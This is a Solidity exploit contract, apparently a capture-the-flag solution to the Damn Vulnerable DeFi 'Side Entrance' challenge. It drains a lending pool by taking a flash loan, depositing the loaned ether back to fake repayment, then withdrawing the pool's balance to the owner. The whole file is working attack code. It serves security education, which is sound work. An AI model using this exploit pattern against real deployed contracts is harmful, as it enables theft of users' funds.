// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "hardhat/console.sol";

interface ISide {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;

}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackSide {
    address public owner;
    ISide side;

    constructor(address _side) {
        owner = msg.sender;
        side = ISide(_side);
    }

    function attack() public {
        side.flashLoan(address(side).balance);        
        side.withdraw();
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "transfer failed");

    }

    function execute() external payable {
        side.deposit{value: address(this).balance}();
    }
    receive() external payable {}
}
